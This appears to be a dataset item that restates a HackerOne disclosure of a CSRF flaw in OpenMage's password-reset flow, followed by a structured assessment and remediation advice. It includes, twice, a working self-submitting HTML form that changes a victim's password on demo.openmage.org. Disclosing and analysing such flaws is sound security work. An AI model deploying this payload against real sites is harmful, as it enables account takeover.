# CSRF — h1

- source: h1
- class: csrf
- cwe: CWE-352
- cve: ['CVE-2021-21395']
- severity: low
- program: openmage
- quality_score: 11

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** CSRF in changing password after using reset password link
**Affected Asset:** demo.openmage.org

**Vulnerability Description:**
Affected Component: demo.openmage.org
Vulnerability Type: Cross-Site Request Forgery (CSRF)

## Summary:
Hey OpenMage, the forgot password page is not protected against CSRF attack which can lead to changing password. Use the below form  to test
```html
<html> 
  <body>
    <form  action="https://demo.openmage.org/customer/account/resetpasswordpost/" method="POST">
      <input type="hidden" name="password" value="password123" />
      <input type="hidden" name="confirmation" value="password123" />
    </form>
   <script>document.forms[0].submit()</script>
  </body>
</html>
```
## Steps To Reproduce:

  1. Go to  ```https://demo.openmage.org/customer/account/forgotpassword/```
  2. Enter your email  and ask for password reset link
  3. Load the password reset link and after loading it close it
  4. Now load the above form and boom, password will be changed.

## Impact

Password reset via CSRF

**Steps to Reproduce:**
1. Go to  ```https://demo.openmage.org/customer/account/forgotpassword/```
  2. Enter your email  and ask for password reset link
  3. Load the password reset link and after loading it close it
  4. Now load the above form and boom, password will be changed.

**Proof of Concept:**
```html
<html> 
  <body>
    <form  action="https://demo.openmage.org/customer/account/resetpasswordpost/" method="POST">
      <input type="hidden" name="password" value="password123" />
      <input type="hidden" name="confirmation" value="password123" />
    </form>
   <script>document.forms[0].submit()</script>
  </body>
</html>
```

```https://demo.openmage.org/customer/account/forgotpassword/```

## Analysis / Response

**Vulnerability Class:** csrf
**CWE:** CWE-352
**Weakness:** Cross-Site Request Forgery (CSRF)
**Severity:** low
**Endpoint Pattern:** https://demo.openmage.org/customer/account/resetpasswordpost/

**Impact Assessment:**
Password reset via CSRF

**Remediation:**
Implement anti-CSRF tokens on all state-changing operations. Use the SameSite cookie attribute. Verify Origin and Referer headers.
